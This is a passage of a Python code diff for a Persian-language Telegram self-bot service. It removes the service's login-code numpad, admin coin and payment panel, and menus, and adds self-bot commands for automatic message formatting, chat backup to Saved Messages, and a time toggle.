+    "پاسخ", "دشمن", "فحش", "حذف", "لیست دشمن", "دشمنان", "پاک کردن دشمنان", 
+    "همه", "مدیا", "استیکر", "فوروارد", "وویس", "پیام", "فایل", "وضعیت قفل", 
+    "ریست قفل", "راهنمای قفل", 
+    "انتی لاگین", "ریکت", "حذف ریکت", "لیست ریکت", "پاکسازی ریکت",
+    "ویرایش",
+    "تنظیم بنر", "بنر همگانی", "لیست بنرها", "حذف بنر", "بنر همگانی خاموش", "بنر ارسال", "زمان بنر",
+    "فرمت",
+    "پینگ", "تعداد کانال ها", "تعداد گروه ها", "خروج همه کانال", "خروج همه گروه",
+    "اکشن",
+    "اینستا" 
+], prefixes=""))
+async def auto_html_format_messages(client, message):
+    if any(format_settings.values()):
+        original_text = message.text
+        formatted_text = original_text
+        for format_name, is_active in format_settings.items():
+            if is_active:
+                formatted_text = html_tags[format_name].format(formatted_text)        
+        try:
+            await message.edit_text(
+                formatted_text,
                 parse_mode=enums.ParseMode.HTML
             )
         except Exception as e:
-            print(f"❌ خطا در ویرایش پیام: {e}")
-        
-        await callback_query.answer()
-        
-    elif data == "code_send":
-        if len(current_code) == 5:
-            await callback_query.answer("✅ کد ارسال شد...", show_alert=True)
-            class FakeMessage:
-                def __init__(self, user_id, code):
-                    self.from_user = type('obj', (object,), {'id': user_id})()
-                    self.text = code
-                    self.chat = type('obj', (object,), {'id': user_id})()
-                    self.reply_text = None
-                    
-                async def reply_text(self, text, *args, **kwargs):
-                    await client.send_message(user_id, text, *args, **kwargs)
-            
-            fake_msg = FakeMessage(user_id, current_code)
-
-            await handle_code_from_keyboard(client, fake_msg)
-            
-            user_temp_codes.pop(user_id, None)
-        else:
-            await callback_query.answer(f"❌ کد باید 5 رقم باشد (الان {len(current_code)} رقم)", show_alert=True)
-            
-    elif data == "code_cancel":
-        user_temp_codes.pop(user_id, None)
-        try:
-            await safe_edit_message(callback_query.message, 
-                "❌ **ورود کد لغو شد**\n\n"
-                "برای شروع مجدد از /start استفاده کنید",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔙 بازگشت", callback_data="back")]
-                ])
-            )
-        except Exception as e:
-            print(f"❌ خطا در ویرایش پیام: {e}")
-        
-        await callback_query.answer()
-        
-    else:
-        number = data.split("_")[1]
-        
-        if len(current_code) < 5:
-            new_code = current_code + number
-            user_temp_codes[user_id] = new_code
-            formatted = format_code_display(new_code)
-            
-            try:
-                await safe_edit_message(callback_query.message, 
-                    f"🔢 **کد تایید را وارد کنید:**\n\n"
-                    f"<b><code>{formatted}</code></b>\n\n"
-                    f"📱 کد {len(new_code)}/5 رقم وارد شد",
-                    reply_markup=create_numpad_keyboard(),
-                    parse_mode=enums.ParseMode.HTML
-                )
-            except Exception as e:
-                print(f"❌ خطا در ویرایش پیام: {e}")
-            
-            await callback_query.answer()
-        else:
-            await callback_query.answer("❌ کد کامل شده است! روی 'ارسال' کلیک کنید", show_alert=True)
-
-async def admin_callback_handler(client, callback_query):
-    data = callback_query.data
-    user_id = callback_query.from_user.id
+            print(f"❌ خطا در فرمت کردن پیام: {e}")
+@app.on_message(filters.me & filters.command("سیو", prefixes=""))
+async def save_command(client: Client, message: Message):
+    if len(message.command) < 2: 
+        return await message.edit_text("**لطفا یوزرنیم کاربر را وارد کنید**\n\nمثال: `سیو @LuminousPath`")
     
-    # ====== لیست کاربران ======
-    if data == "admin_list":
-        users = db.get_all("users")
-        if not users:
-            await safe_edit_message(callback_query.message, "❌ هیچ کاربری ثبت نشده است.")
-            return
-        
-        text = "👥 **لیست کاربران:**\n\n"
-        for i, (uid, info) in enumerate(list(users.items())[:20], 1):
-            credits = db.get("credits", int(uid), 0)
-            status = "🟢" if info.get('status') == 'active' else "🔴"
-            text += f"{i}. {status} `{uid}` → {credits} سکه\n"
-        
-        if len(users) > 20:
-            text += f"\n... و {len(users) - 20} کاربر دیگر"
-        
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back")]
-        ])
-        await safe_edit_message(callback_query.message, text, reply_markup=keyboard)
-        await callback_query.answer()
-    
-    # ====== آمار کامل ======
-    elif data == "admin_stats":
-        users = db.get_all("users")
-        processes = db.get_all("processes")
-        credits = db.get_all("credits")
-        payments = db.get_all("payments")
-        
-        total_users = len(users)
-        active_users = len(processes)
-        total_credits = sum(credits.values()) if credits else 0
-        pending_pay = sum(1 for p in payments.values() if p.get('status') == 'pending')
-        
-        text = f"""
-📊 **آمار کامل سیستم**
-
-👥 **کاربران کل:** {total_users}
-🟢 **فعال:** {active_users}
-💰 **مجموع سکه‌ها:** {total_credits:,}
-
-💳 **درخواست پرداخت:** {pending_pay}
-
-📅 **تاریخ:** {time.ctime()}
-"""
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back")]
-        ])
-        await safe_edit_message(callback_query.message, text, reply_markup=keyboard)
-        await callback_query.answer()
-    
-    # ====== برترین کاربران ======
-    elif data == "admin_top":
-        credits = db.get_all("credits")
-        if not credits:
-            await safe_edit_message(callback_query.message, "❌ هیچ کاربری سکه ندارد.")
-            return
-        
-        sorted_users = sorted(credits.items(), key=lambda x: x[1], reverse=True)[:10]
-        text = "🏆 **برترین کاربران از نظر سکه:**\n\n"
-        for i, (uid, amount) in enumerate(sorted_users, 1):
-            user_data = db.get("users", int(uid), {})
-            name = user_data.get('first_name', 'ناشناس')
-            text += f"{i}. {name} → `{amount:,}` سکه\n"
-        
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back")]
-        ])
-        await safe_edit_message(callback_query.message, text, reply_markup=keyboard)
-        await callback_query.answer()
-    
-    # ====== توقف همه ======
-    elif data == "admin_stop_all":
-        await safe_edit_message(callback_query.message, "🛑 **در حال توقف همه سلف‌بات‌ها...**")
-        stop_all_selfbots()
-        await asyncio.sleep(1)
-        await safe_edit_message(callback_query.message, "✅ **همه سلف‌بات‌ها متوقف شدند.**")
-        await callback_query.answer()
-    
-    # ====== درخواست‌های پرداخت ======
-    elif data == "admin_payments":
-        payments = db.get_pending_payments()
-        if not payments:
-            await safe_edit_message(callback_query.message, "❌ هیچ درخواست پرداخت در انتظاری وجود ندارد.")
-            return
-        
-        text = "💳 **درخواست‌های پرداخت:**\n\n"
-        for uid, info in list(payments.items())[:10]:
-            name = info.get('first_name', 'ناشناس')
-            coins = info.get('coins', 0)
-            text += f"👤 {name} → `{uid}` | {coins} سکه\n"
-        
-        if len(payments) > 10:
-            text += f"\n... و {len(payments) - 10} درخواست دیگر"
-        
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back")]
-        ])
-        await safe_edit_message(callback_query.message, text, reply_markup=keyboard)
-        await callback_query.answer()
-    
-    # ====== مدیریت عکس شرط و دوز ======
-    elif data == "admin_photo_manager":
-        if user_id != ADMIN_ID:
-            await callback_query.answer("⛔ دسترسی ندارید.", show_alert=True)
-            return
-        kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📤 ارسال عکس جدید", callback_data="set_bet_photo")],
-            [InlineKeyboardButton("🗑 حذف عکس", callback_data="del_bet_photo")],
-            [InlineKeyboardButton("🔙 بازگشت به پنل مدیریت", callback_data="admin_back")]
-        ])
-        status = "عکس ذخیره شده: ✅ فعال" if db.data.get("bet_doz_image") else "عکس ذخیره شده: ❌ ندارد"
-        await safe_edit_message(callback_query.message, f"🖼 **مدیریت عکس شرط و دوز**\n\n{status}", reply_markup=kb)
-        await callback_query.answer()
-
-    elif data == "set_bet_photo":
-        if user_id != ADMIN_ID:
-            await callback_query.answer("⛔ دسترسی ندارید.", show_alert=True)
-            return
-        admin_photo_wait.add(user_id)
-        await callback_query.answer("✅ حالا عکس را ارسال کنید.")
-        await client.send_message(user_id, "📤 **عکس جدید شرط و دوز را ارسال کنید.**")
-
-    elif data == "del_bet_photo":
-        if user_id != ADMIN_ID:
-            await callback_query.answer("⛔ دسترسی ندارید.", show_alert=True)
-            return
-        db.data.pop("bet_doz_image", None)
-        ok = db.save_data()
-        if ok:
-            await callback_query.answer("✅ عکس حذف شد.", show_alert=True)
-        else:
-            await callback_query.answer("❌ ذخیره تغییرات ناموفق بود.", show_alert=True)
-        kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📤 ارسال عکس جدید", callback_data="set_bet_photo")],
-            [InlineKeyboardButton("🗑 حذف عکس", callback_data="del_bet_photo")],
-            [InlineKeyboardButton("🔙 بازگشت به پنل مدیریت", callback_data="admin_back")]
-        ])
-        await safe_edit_message(callback_query.message, "🖼 **مدیریت عکس شرط و دوز**\n\nعکس ذخیره شده: ❌ ندارد", reply_markup=kb)
-
-    # ====== سکه همگانی ======
-    elif data == "admin_global_coins":
-        db.set("temp_data", f"admin_global_coins_{user_id}", True)
-        await safe_edit_message(callback_query.message, "🪙 تعداد الماسی که می‌خواهید به همه کاربران اضافه شود را ارسال کنید:")
-        await callback_query.answer()
-
-    # ====== بازگشت به پنل ادمین ======
-    elif data == "admin_back":
-        await admin_panel(client, callback_query.message)
-        await callback_query.answer()
-    
-    # ====== تنظیم سکه (از دکمه) ======
-    elif data.startswith("set_"):
-        target_id = int(data.split("_")[1])
-        db.set("temp_data", f"admin_set_{user_id}", target_id)
-        await safe_edit_message(callback_query.message, 
-            f"💰 **تعداد سکه جدید برای کاربر {target_id} را وارد کنید:**",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 انصراف", callback_data="admin_back")]
-            ])
-        )
-        await callback_query.answer()
-    
-    # ====== توقف سلف (از دکمه) ======
-    elif data.startswith("stop_"):
-        target_id = int(data.split("_")[1])
-        if stop_selfbot(target_id):
-            await safe_edit_message(callback_query.message, f"✅ سلف‌بات کاربر {target_id} متوقف شد.")
-        else:
-            await safe_edit_message(callback_query.message, f"ℹ️ سلف‌بات کاربر {target_id} از قبل متوقف بود.")
-        await callback_query.answer()
-    
-    # ====== تایید پرداخت ======
-    elif data.startswith("payment_approve_"):
-        target_id = int(data.split("_")[2])
-        payment_data = db.get("payments", target_id)
-        if payment_data:
-            coins = payment_data.get("coins", 0)
-            current = db.get("credits", target_id, 0)
-            db.set("credits", target_id, current + coins)
-            payment_data["status"] = "approved"
-            db.set("payments", target_id, payment_data)
-            
-            await safe_edit_message(callback_query.message, 
-                f"✅ پرداخت کاربر {target_id} تایید شد.\n"
-                f"💰 {coins} سکه به حسابش اضافه شد."
-            )
-            try:
-                await bot.send_message(
-                    target_id,
-                    f"✅ **پرداخت شما تایید شد!**\n\n"
-                    f"💰 {coins} سکه به حساب شما اضافه شد.\n"
-                    f"📊 موجودی جدید: {db.get('credits', target_id, 0)} سکه"
-                )
-            except:
-                pass
-        else:
-            await safe_edit_message(callback_query.message, f"❌ اطلاعات پرداخت کاربر {target_id} یافت نشد.")
-        await callback_query.answer()
-    
-    # ====== رد پرداخت ======
-    elif data.startswith("payment_reject_"):
-        target_id = int(data.split("_")[2])
-        payment_data = db.get("payments", target_id)
-        if payment_data:
-            payment_data["status"] = "rejected"
-            db.set("payments", target_id, payment_data)
-            
-            await safe_edit_message(callback_query.message, f"❌ پرداخت کاربر {target_id} رد شد.")
-            try:
-                await bot.send_message(
-                    target_id,
-                    "❌ **پرداخت شما رد شد!**\n\n"
-                    "لطفا مجدداً با ارسال رسید واضح‌تر اقدام کنید."
-                )
-            except:
-                pass
-        else:
-            await safe_edit_message(callback_query.message, f"❌ اطلاعات پرداخت کاربر {target_id} یافت نشد.")
-        await callback_query.answer()
-        
-@bot.on_message(filters.command("set") & filters.user(ADMIN_ID))
-async def set_credits(client, message: Message):
-    if len(message.command) != 3:
-        await message.reply_text("❌ فرمت: `/set آیدی تعداد`")
-        return
-    
+    chat_input = message.command[1].lstrip('@')
     try:
-        target_id = int(message.command[1])
-        amount = int(message.command[2])
-        db.set("credits", target_id, amount)
-        
-        await message.reply_text(f"✅ سکه کاربر {target_id} تنظیم شد به {amount}")
-        
-        try:
-            await bot.send_message(target_id, f"🔧 موجودی سکه شما تنظیم شد\n💰 جدید: {amount} سکه")
-        except: 
-            pass
-        
+        user = await client.get_users(chat_input)
+        chat_id, user_name = user.id, f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{user.id}"
     except: 
-        await message.reply_text("❌ آیدی/تعداد باید عدد باشد")
-
-@bot.on_message(filters.command("user") & filters.user(ADMIN_ID))
-async def user_info(client, message: Message):
-    if len(message.command) != 2:
-        await message.reply_text("❌ فرمت: `/user آیدی`")
-        return
+        return await message.edit_text(f"**کاربر '{chat_input}' پیدا نشد**")
     
-    try:
-        target_id = int(message.command[1])
-        user_data = db.get("users", target_id, {})
-        credits = db.get("credits", target_id, 0)
-        process = db.get("processes", target_id)
-        timer = db.get("timers", target_id)
-        
-        if not user_data:
-            await message.reply_text("❌ کاربر یافت نشد")
-            return
-        
-        status = "🟢 فعال" if user_data.get('status') == 'active' else "🔴 غیرفعال"
-        phone = user_data.get('phone', '❌ ثبت نشده')
-        created = time.ctime(user_data.get('created_at', time.time()))
-        running = "🟢 بله" if process else "🔴 خیر"
-        has_timer = "🟢 فعال" if timer and timer.get('is_running') else "🔴 غیرفعال"
-        
-        created_time = user_data.get('created_at', time.time())
-        time_diff = time.time() - created_time
-        days = int(time_diff // 86400)
-        hours = int((time_diff % 86400) // 3600)
-        
-        info_text = f"""
-👤 **اطلاعات کاربر {target_id}**
-
-📱 **شماره:** `{phone}`
-📊 **وضعیت:** {status}
-💰 **سکه ها:** `{credits}`
-🔄 **سلف:** {running}
-📅 **تاریخ ایجاد:** `{created}`
-⏳ **عضو شده:** {days} روز و {hours} ساعت
-
-⏱ **زمان باقی‌مانده:** `{credits}` ساعت
-💸 **مصرف سکه:** 1 سکه در ساعت
-"""
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🎯 تنظیم سکه", callback_data=f"set_{target_id}"),
-             InlineKeyboardButton("🛑 توقف سلف", callback_data=f"stop_{target_id}")]
-        ])
-        
-        await message.reply_text(info_text, reply_markup=keyboard)
-        
-    except: 
-        await message.reply_text("❌ آیدی باید عدد باشد")
-
-def create_main_menu(user_id):
-    """منوی اصلی: دقیقاً ۶ بخش عمودی؛ ردیف‌های ۱،۳،۵،۶ تمام‌عرض و ردیف‌های ۲،۴ دو ستونه."""
-    # این فاصله‌های یونی‌کد فقط برای بزرگ‌تر و یکدست‌تر دیده شدن متن دکمه‌هاست.
-    # ساختار ردیف‌ها همان چیزی است که تعیین می‌کند کدام دکمه‌ها زیر هم یا کنار هم باشند.
-    wide = "\u2007" * 8
-    half = "\u2007" * 3
-
-    return InlineKeyboardMarkup([
-        # بخش ۱: یک دکمه بزرگ و تمام‌عرض
-        [InlineKeyboardButton(
-            f"{wide}🛒 خرید سلف{wide}",
-            callback_data="increase_balance",
-            style=KeyboardButtonStyle(bg_success=True)
-        )],
-
-        # بخش ۲: دو دکمه بزرگ کنار هم
-        [
-            InlineKeyboardButton(
-                f"{half}👤 حساب کاربری{half}",
-                callback_data="status_credits",
-                style=KeyboardButtonStyle(bg_primary=True)
-            ),
-            InlineKeyboardButton(
-                f"{half}👥 زیرمجموعه{half}",
-                callback_data="referral",
-                style=KeyboardButtonStyle(bg_success=True)
-            )
-        ],
-
-        # بخش ۳: یک دکمه بزرگ و تمام‌عرض
-        [InlineKeyboardButton(
-            f"{wide}⚙️ مدیریت بات ⚙️{wide}",
-            callback_data="self_management",
-            style=KeyboardButtonStyle(bg_primary=True)
-        )],
-
-        # بخش ۴: دو دکمه بزرگ کنار هم
-        [
-            InlineKeyboardButton(
-                f"{half}• راهنمای خرید •{half}",
-                callback_data="buy_guide",
-                style=KeyboardButtonStyle(bg_primary=True)
-            ),
-            InlineKeyboardButton(
-                f"{half}• خرید الماس •{half}",
-                callback_data="increase_balance",
-                style=KeyboardButtonStyle(bg_success=True)
-            )
-        ],
-
-        # بخش ۵: یک دکمه بزرگ و تمام‌عرض
-        [InlineKeyboardButton(
-            f"{wide}👨‍💻 پشتیبانی 👨‍💻{wide}",
-            callback_data="support",
-            style=KeyboardButtonStyle(bg_success=True)
-        )],
-
-        # بخش ۶: یک دکمه بزرگ و تمام‌عرض
-        [InlineKeyboardButton(
-            f"{wide}📣 چنل ما 📣{wide}",
-            callback_data="buy_channel",
-            style=KeyboardButtonStyle(bg_primary=True)
-        )]
-    ])
-
-async def show_main_menu(client, chat_id, user):
-    """نمایش منوی اصلی پس از /start یا تایید عضویت اجباری."""
-    user_id = user.id
-
-    existing_user = db.get("users", user_id)
-    is_new_user = False
-
-    if not existing_user:
-        user_info = {
-            "status": "inactive",
-            "created_at": time.time(),
-            "first_name": user.first_name or "",
-            "username": user.username or ""
-        }
-        db.set("users", user_id, user_info)
-        is_new_user = True
-    else:
-        user_info = existing_user
-        user_info["first_name"] = user.first_name or ""
-        user_info["username"] = user.username or ""
-        db.set("users", user_id, user_info)
-
-    credits = db.get("credits", user_id, 0)
-    if is_new_user and credits == 0:
-        db.set("credits", user_id, 5)
-        credits = 5
-
-    # ادمین هم باید بتواند ربات را مثل یک کاربر عادی استفاده کند.
-    # پنل مدیریت فقط با دستور /admin باز می‌شود.
-    user_data = db.get("users", user_id, {})
-    status = "🟢 فعال" if user_data.get('status') == 'active' else "🔴 غیرفعال"
-    phone = user_data.get('phone', '')
-    keyboard = create_main_menu(user_id)
-
-    welcome_text = f"""**🌺 به ربات سلف ساز خوش آمدید!**
-
-🤖 **ربات مدیریت سلف بات حرفه‌ای**
-├─ ساخت سلف شخصی
-📊 **وضعیت حساب شما:**
-├─ 👤 کاربر: {user.first_name or "ناشناس"}
-├─ 🔋 وضعیت: {status}
-├─ 💰 سکه: {credits} عدد
-└─ ⏰ مصرف 1 سکه در ساعت
-
-{f"📱 **شماره:** `{phone}`" if phone else "⚠️ **شماره ثبت نشده**"}
-
-💡 برای شروع روی «فعالسازی» کلیک کنید.
-{MENU_WIDTH_PAD}"""
-
-    await client.send_message(chat_id, welcome_text, reply_markup=keyboard)
-
-@bot.on_callback_query(filters.regex(r"^ADMIN_PHOTO_PANEL$"))
-async def admin_photo_panel_handler(client, callback_query):
-    if callback_query.from_user.id != ADMIN_ID:
-        await callback_query.answer("❌ دسترسی غیرمجاز!", show_alert=True)
-        return
-    status = "✅ فعال" if db.data.get("bet_doz_image") else "❌ ندارد"
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("📤 ارسال عکس جدید", callback_data="ADMIN_PHOTO_SET")],
-        [InlineKeyboardButton("🗑 حذف عکس", callback_data="ADMIN_PHOTO_DELETE")],
-        [InlineKeyboardButton("🔙 بازگشت به پنل مدیریت", callback_data="ADMIN_PANEL_BACK")]
-    ])
-    await callback_query.message.edit_text(
-        f"🖼 **مدیریت عکس شرط و دوز**\n\nوضعیت عکس: {status}",
-        reply_markup=kb
-    )
-    await callback_query.answer()
-
-@bot.on_callback_query(filters.regex(r"^ADMIN_PHOTO_SET$"))
-async def admin_photo_set_handler(client, callback_query):
-    if callback_query.from_user.id != ADMIN_ID:
-        await callback_query.answer("❌ دسترسی غیرمجاز!", show_alert=True)
-        return
-    admin_photo_wait.add(ADMIN_ID)
-    await callback_query.answer("✅ عکس را در همین چت ارسال کنید.", show_alert=True)
-
-@bot.on_callback_query(filters.regex(r"^ADMIN_PHOTO_DELETE$"))
-async def admin_photo_delete_handler(client, callback_query):
-    if callback_query.from_user.id != ADMIN_ID:
-        await callback_query.answer("❌ دسترسی غیرمجاز!", show_alert=True)
-        return
-    db.data.pop("bet_doz_image", None)
-    ok = db.save_data()
-    await callback_query.answer("✅ عکس حذف شد." if ok else "❌ خطا در ذخیره دیتابیس.", show_alert=True)
-    await callback_query.message.edit_text(
-        "🖼 **مدیریت عکس شرط و دوز**\n\nوضعیت عکس: ❌ ندارد",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("📤 ارسال عکس جدید", callback_data="ADMIN_PHOTO_SET")],
-            [InlineKeyboardButton("🗑 حذف عکس", callback_data="ADMIN_PHOTO_DELETE")],
-            [InlineKeyboardButton("🔙 بازگشت به پنل مدیریت", callback_data="ADMIN_PANEL_BACK")]
-        ])
-    )
-
-@bot.on_callback_query(filters.regex(r"^ADMIN_PANEL_BACK$"))
-async def admin_panel_back_handler(client, callback_query):
-    if callback_query.from_user.id != ADMIN_ID:
-        await callback_query.answer("❌ دسترسی غیرمجاز!", show_alert=True)
-        return
-    await admin_panel(client, callback_query.message)
-    await callback_query.answer()
-
-@bot.on_callback_query()
-async def callback_handler(client, callback_query):
-    user_id = callback_query.from_user.id
-    data = callback_query.data
-
-    # ==============================
-    # زیرمجموعه
-    # ==============================
-    if data == "referral":
-        bot_info = await client.get_me()
-        referral_link = f"https://t.me/{bot_info.username}?start=ref_{user_id}"
-
-        referral_text = (
-            "👥 **سیستم زیرمجموعه**\n\n"
-            "با لینک اختصاصی خود دوستانتان را به ربات دعوت کنید.\n\n"
-            f"🔗 **لینک دعوت شما:**\n`{referral_link}`\n\n"
-            "📊 تعداد زیرمجموعه‌های شما در نسخه فعلی هنوز ذخیره نمی‌شود."
-        )
-
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]
-        ])
-
-        await safe_edit_message(callback_query.message, referral_text, reply_markup=keyboard)
-        await callback_query.answer()
-        return
-
-    # ==============================
-    # راهنمای خرید
-    # ==============================
-    if data == "buy_guide":
-        guide_text = (
-            "📖 **راهنمای خرید سلف**\n\n"
-            "1️⃣ روی «🛒 خرید سلف» بزنید.\n"
-            "2️⃣ تعداد سکه موردنیاز را انتخاب یا وارد کنید.\n"
-            "3️⃣ مبلغ را طبق اطلاعات پرداخت واریز کنید.\n"
-            "4️⃣ رسید پرداخت را ارسال کنید تا توسط مدیریت بررسی شود.\n\n"
-            "💡 هر 1 سکه معادل 1 ساعت زمان استفاده از سلف است."
-        )
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🛒 خرید سلف", callback_data="increase_balance", style=KeyboardButtonStyle(bg_success=True))],
-            [InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]
-        ])
-        await safe_edit_message(callback_query.message, guide_text, reply_markup=keyboard)
-        await callback_query.answer()
-        return
-
-    # ==============================
-    # پشتیبانی
-    # ==============================
-    if data == "support":
-        if not SUPPORT_USERNAME or SUPPORT_USERNAME == "YourSupportUsername":
-            await callback_query.answer("⚠️ یوزرنیم پشتیبانی هنوز تنظیم نشده است.", show_alert=True)
-            return
-
-        support_text = (
-            "👨‍💻 **پشتیبانی**\n\n"
-            "برای ارتباط با پشتیبانی روی دکمه زیر کلیک کنید."
-        )
-
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("💬 ارتباط با پشتیبانی", url=f"https://t.me/{SUPPORT_USERNAME}", style=KeyboardButtonStyle(bg_success=True))],
-            [InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]
-        ])
-
-        await safe_edit_message(callback_query.message, support_text, reply_markup=keyboard)
-        await callback_query.answer()
-        return
-
-    # ==============================
-    # کانال خرید
-    # ==============================
-    if data == "buy_channel":
-        if not BUY_CHANNEL_USERNAME or BUY_CHANNEL_USERNAME == "YourChannelUsername":
-            await callback_query.answer("⚠️ یوزرنیم کانال خرید هنوز تنظیم نشده است.", show_alert=True)
-            return
-
-        channel_text = (
-            "📣 **کانال خرید**\n\n"
-            "برای مشاهده اطلاعات خرید و اطلاعیه‌ها وارد کانال شوید."
-        )
-
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📣 ورود به کانال", url=f"https://t.me/{BUY_CHANNEL_USERNAME}", style=KeyboardButtonStyle(bg_success=True))],
-            [InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]
-        ])
-
-        await safe_edit_message(callback_query.message, channel_text, reply_markup=keyboard)
-        await callback_query.answer()
-        return
-
-    # ==============================
-    # راهنما
-    # ==============================
-    if data == "help":
-        help_text = (
-            "📢 **راهنمای سلف بات**\n\n"
-            "برای مشاهده راهنمای کامل دستورات و امکانات، وارد ربات هلپر شوید."
-        )
-
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📖 ورود به ربات راهنما", url=f"https://t.me/{HELPER_BOT_USERNAME}", style=KeyboardButtonStyle(bg_primary=True))],
-            [InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]
-        ])
-
-        await safe_edit_message(callback_query.message, help_text, reply_markup=keyboard)
-        await callback_query.answer()
-        return
+    loading_msg = await message.edit_text(f"🔄 **در حال پشتیبان‌گیری از {user_name}...**")
+    success, result, message_count, user_name = await backup_chat(client, chat_id, message.id)
     
-    if data == "balance_noop":
-        await callback_query.answer("💎 اطلاعات موجودی شما", show_alert=False)
-        return
+    if success:
+        await loading_msg.edit_text("**در حال آپلود فایل پشتیبان...**")
+        await client.send_document(
+            "me", 
+            document=result, 
+            caption=f"**پشتیبان‌گیری کامل شد**\n\n**کاربر:** {user_name}\n**آیدی:** `{chat_id}`\n**تعداد پیام‌ها:** {message_count}\n**فرمت:** فایل متنی (TXT)\n**تاریخ:** {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+        )
+        os.remove(result)
+        await loading_msg.delete()
+    else: 
+        await loading_msg.edit_text(f"❌ **خطا در پشتیبان‌گیری:**\n`{result}`")
 
-    if data.startswith("ttt_join_") or data.startswith("ttt_move_"):
-        await handle_ttt_callback(client, callback_query)
-        return
-
-    if data.startswith("joinbet_"):
-        if data == "joinbet_waiting":
-            await callback_query.answer("⏳ لطفا چند لحظه صبر کنید...", show_alert=True)
-            return
-        await join_group_bet_handler(client, callback_query)
-        return
+@app.on_message(filters.me & filters.command("تایم", prefixes="") & filters.regex(r"^تایم (روشن|خاموش)$"))
+async def time_command(client: Client, message: Message):
+    global time_updater_started  
+    if len(message.command) < 2: 
+        return await message.edit("**استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")
     
-    if data.startswith("cancelbet_"):
-        if data == "cancelbet_waiting":
-            await callback_query.answer("⏳ لطفا چند لحظه صبر کنید...", show_alert=True)
-            return
-        await cancel_group_bet_handler(client, callback_query)
-        return
-    is_admin_action = (
-        data.startswith(("admin_", "set_", "payment_"))
-        or (data.startswith("stop_") and data != "stop_self")
-    )
-    if is_admin_action:
-        if user_id != ADMIN_ID:
-            await callback_query.answer("❌ دسترسی غیرمجاز!", show_alert=True)
-            return
-        await admin_callback_handler(client, callback_query)
-        return
-    if data == "login":
-        credits = db.get("credits", user_id, 0)
-        if credits <= 0:
-            await safe_edit_message(callback_query.message, 
-                f"❌ **سکه کافی ندارید!**\n\n💰 سکه های شما: `{credits}`\n\n💡 برای دریافت سکه با پشتیبانی تماس بگیرید.",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]])
-            )
-            return
-            
-        await safe_edit_message(callback_query.message, 
-            "📱 **لطفا شماره تلفن خود را ارسال کنید:**\n\n"
-            "**فرمت:** +989123456789\n\n"
-            "⚠️ شماره باید با کد کشور شروع شود",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]])
-        )
-        await callback_query.answer()
-    
-    elif data == "login_again":
-        await safe_edit_message(callback_query.message, 
-            "📱 **لطفا شماره تلفن جدید خود را ارسال کنید:**\n\n"
-            "**فرمت:** +989123456789\n\n"
-            "⚠️ شماره باید با کد کشور شروع شود",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]])
-        )
-        await callback_query.answer()
-    elif data == "status_credits":
-        user_data = db.get("users", user_id, {})
-        credits = db.get("credits", user_id, 0)
-        
-        if not user_data:
-            text = "❌ **شما هیچ سلف باتی ندارید**\n\nابتدا باید لاگین کنید و سلف بات را فعال کنید."
-        elif user_data.get('status') == 'active':
-            text = (
-                f"🟢 **سلف بات فعال**\n\n"
-                f"📱 **شماره:** `{user_data.get('phone', '')}`\n"
-                f"💰 **سکه باقی‌مانده:** `{credits}`\n"
-                f"⏰ **زمان باقی‌مانده:** `{credits}` ساعت\n\n"
-                f"⏱ **مصرف:** 1 سکه در ساعت"
-            )
-        else:
-            text = (
-                f"🔴 **سلف بات غیرفعال**\n\n"
-                f"📱 **شماره:** `{user_data.get('phone', '')}`\n"
-                f"💰 **سکه های شما:** `{credits}`\n\n"
-                f"💡 برای فعال کردن سلف بات روی 'فعالسازی' کلیک کنید."
-            )
-        
-        await safe_edit_message(callback_query.message, 
-            text,
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]])
-        )
-        await callback_query.answer()
-    elif data == "bet":
-        await betting_info_handler(client, callback_query.message)
-        await callback_query.answer()
-    elif data == "self_management":
-        user_data = db.get("users", user_id, {})
-        credits = db.get("credits", user_id, 0)
-        
-        is_active = user_data.get('status') == 'active'
-        process = db.get("processes", user_id)
-        status_text = "🟢 **فعال**" if is_active and process else "🔴 **غیرفعال**"
-        
-        # هر دکمه در یک ردیف جدا قرار گرفته تا تمام عرض کیبورد را بگیرد.
-        keyboard = InlineKeyboardMarkup([
-            [
-                InlineKeyboardButton(
-                    "▶️ روشن کردن سلف",
-                    callback_data="self_start",
-                    style=KeyboardButtonStyle(bg_success=True)
-                )
-            ],
-            [
